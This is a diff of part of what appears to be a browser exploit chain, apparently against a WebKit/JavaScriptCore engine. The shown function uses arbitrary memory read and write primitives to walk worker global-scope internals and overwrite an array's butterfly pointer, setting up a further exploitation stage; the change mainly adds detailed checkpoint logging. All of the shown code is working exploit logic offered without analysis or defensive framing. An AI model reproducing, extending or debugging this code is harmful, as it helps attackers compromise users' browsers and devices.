@@ -18059,19 +18059,34 @@ const device_chipset = {
           if (!worker)
               throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
 
-          print(`worker: ${worker.hex()}`);
-
+          resolverCheckpoint(`worker selected=${worker.hex()}`);
+          resolverCheckpoint(`reading worker script at ${(worker + 0x150n).hex()}`);
           const script = read64(worker + 0x150n);
+          resolverCheckpoint(`worker script=${script.hex()}`);
+          resolverCheckpoint(`reading workerOrWorkletThread at ${(worker + 0x160n).hex()}`);
           const workerOrWorkletThread = read64(worker + 0x160n);
+          resolverCheckpoint(`workerOrWorkletThread=${workerOrWorkletThread.hex()}`);
+          resolverCheckpoint(`reading Strong_globalScopeWrapper at ${(script + 0x20n).hex()}`);
           const Strong_globalScopeWrapper = read64(script + 0x20n);
+          resolverCheckpoint(`Strong_globalScopeWrapper=${Strong_globalScopeWrapper.hex()}`);
+          resolverCheckpoint(`reading globalScopeWrapper at ${Strong_globalScopeWrapper.hex()}`);
           const globalScopeWrapper = read64(Strong_globalScopeWrapper);
+          resolverCheckpoint(`globalScopeWrapper=${globalScopeWrapper.hex()}`);
+          resolverCheckpoint(`reading worker_global_butterfly at ${(globalScopeWrapper + 8n).hex()}`);
           const worker_global_butterfly = read64(globalScopeWrapper + 8n);
-          print(`butterfly:${worker_global_butterfly.hex()}`);
+          resolverCheckpoint(`butterfly:${worker_global_butterfly.hex()}`);
+          resolverCheckpoint(`reading unboxed_arr at ${worker_global_butterfly.hex()}`);
           const unboxed_arr = read64(worker_global_butterfly);
+          resolverCheckpoint(`unboxed_arr=${unboxed_arr.hex()}`);
+          resolverCheckpoint(`reading boxed_arr at ${(worker_global_butterfly + 8n).hex()}`);
           const boxed_arr = read64(worker_global_butterfly + 8n);
+          resolverCheckpoint(`boxed_arr=${boxed_arr.hex()}`);
+          resolverCheckpoint(`reading butterfly at ${(boxed_arr + 8n).hex()}`);
           const butterfly = read64(boxed_arr + 8n);
+          resolverCheckpoint(`boxed butterfly=${butterfly.hex()}`);
+          resolverCheckpoint(`writing unboxed_arr butterfly slot at ${(unboxed_arr + 8n).hex()}`);
           write64(unboxed_arr + 8n, butterfly);
-          print("Finished stage1 prim succesfully");
+          resolverCheckpoint("Finished stage1 prim succesfully");
         }
         function setup_stage2_prim()
         {
